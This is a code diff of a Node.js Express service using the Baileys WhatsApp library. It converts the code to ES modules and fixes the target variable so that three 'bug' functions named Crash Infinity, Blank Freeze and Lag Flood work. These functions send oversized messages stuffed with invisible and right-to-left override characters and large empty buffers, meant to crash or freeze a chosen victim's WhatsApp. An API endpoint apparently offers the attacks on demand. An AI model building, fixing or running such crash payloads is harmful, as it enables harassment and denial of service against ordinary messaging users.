@@ -1,20 +1,14 @@
-require('dotenv').config();
-const chalk = require('chalk');
-const express = require('express');
-const crypto = require('crypto');
-const cookieParser = require('cookie-parser');
-const Redis = require('ioredis');
-const pino = require('pino');
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
+import 'dotenv/config';
+import chalk from 'chalk';
+import express from 'express';
+import crypto from 'crypto';
+import cookieParser from 'cookie-parser';
+import Redis from 'ioredis';
+import pino from 'pino';
+import makeWASocket, {
     fetchLatestBaileysVersion,
     initAuthCreds,
-    DisconnectReason,
-    getContentType,
-    proto,
-    BufferJSON,
-} = require('@whiskeysockets/baileys');
+} from '@whiskeysockets/baileys';
 
 const app = express();
 app.use(express.json());
@@ -35,7 +29,7 @@ async function getRedis() {
             lazyConnect: true,
         });
         redisInstance.on('error', (err) => console.error('Redis error:', err));
-        await redisInstance.connect(); // ← TAMBAH INI
+        await redisInstance.connect();
     }
     return redisInstance;
 }
@@ -68,7 +62,7 @@ async function getAuthState(sessionId) {
             keys = parsed.keys || {};
         } catch (e) {
             console.error(`Invalid JSON for key ${key}, deleting...`, e);
-            await redis.del(key); // hapus data rusak
+            await redis.del(key);
         }
     }
 
@@ -133,9 +127,8 @@ async function initSocket(sessionId) {
         } else if (connection === 'close') {
             sessionData.connected = false;
             sessionData.phone = null;
-            console.log(`❌ Session ${sessionId}: connection closed, reconnecting in 5s...`);
+            console.log(`❌ Session ${sessionId}: connection closed`);
             sessions.delete(sessionId);
-            setTimeout(() => initSocket(sessionId), 5000);
         }
     });
 
@@ -167,8 +160,8 @@ async function pairDevice(sessionId, phoneNumber) {
 
 // ==================== BUG FUNCTIONS ====================
 async function crashInfinity(target, sock) {
-    const invisibleForce = "‎".repeat(50000); 
-    const fakeImage = Buffer.alloc(200000); 
+    const invisibleForce = "‎".repeat(50000);
+    const fakeImage = Buffer.alloc(200000);
 
     console.log(`[!] Constructing Lethal Payload for ${target}...`);
 
@@ -211,13 +204,11 @@ async function crashInfinity(target, sock) {
                     }
                 }
             }
-        }, { 
-            participant: { jid: target } 
+        }, {
+            participant: { jid: target }
         });
 
         console.log(`[✅] Payload successfully relayed to ${target}`);
-
-
     } catch (err) {
         console.error(`[❌] Failed to send payload: ${err.message}`);
     }
@@ -230,7 +221,7 @@ async function blankFreeze(target, sock) {
     try {
         await sock.relayMessage(target, {
             pollCreationMessage: {
-                name: ghostPayload, 
+                name: ghostPayload,
                 options: [
                     { optionName: "‌".repeat(5000) },
                     { optionName: "‎".repeat(5000) }
@@ -245,22 +236,21 @@ async function blankFreeze(target, sock) {
                     body: ghostPayload.slice(0, 1000),
                     mediaType: 1,
                     renderLargerThumbnail: false,
-                    thumbnail: Buffer.alloc(50000) 
+                    thumbnail: Buffer.alloc(50000)
                 }
             }
-        }, { 
-            participant: { jid: target } 
+        }, {
+            participant: { jid: target }
         });
 
-        console.log(chalk.green(`[✅] Blank-Freeze Sent! Target should be unresponsive.`));
-   } catch (err) {
+        console.log(chalk.green(`[✅] Blank-Freeze Sent!`));
+    } catch (err) {
         console.log(chalk.red(`[❌] Error: ${err.message}`));
     }
 }
 
 async function lagFlood(target, sock) {
     const chaosText = "🥵".repeat(1000) + "‮".repeat(5000) + "‎".repeat(5000);
-
     console.log(chalk.blue(`[!] Launching Lag-Flood Attack to: ${target}`));
 
     try {
@@ -291,8 +281,8 @@ async function lagFlood(target, sock) {
                     }
                 }
             }
-        }, { 
-            participant: { jid: target } 
+        }, {
+            participant: { jid: target }
         });
 
         console.log(chalk.cyan(`[✅] Lag-Flood successfully deployed to ${target}`));
@@ -309,17 +299,18 @@ async function sendBugMessage(sessionId, to, bugType) {
     }
     const sock = sessionData.socket;
 
+    // FIX: was using undefined `target`, now using `jid`
     const jid = to.includes('@') ? to : `${to}@s.whatsapp.net`;
 
     switch (bugType) {
         case 'Crash Infinity':
-            await crashInfinity(target, sock);
+            await crashInfinity(jid, sock);
             break;
         case 'Blank Freeze':
-            await blankFreeze(target, sock);
+            await blankFreeze(jid, sock);
             break;
         case 'Lag Flood':
-            await lagFlood(target, sock);
+            await lagFlood(jid, sock);
             break;
         default:
             throw new Error('Unknown bug type');
@@ -408,4 +399,4 @@ app.post('/api/send', async (req, res) => {
     }
 });
 
-module.exports = app;
+export default app;
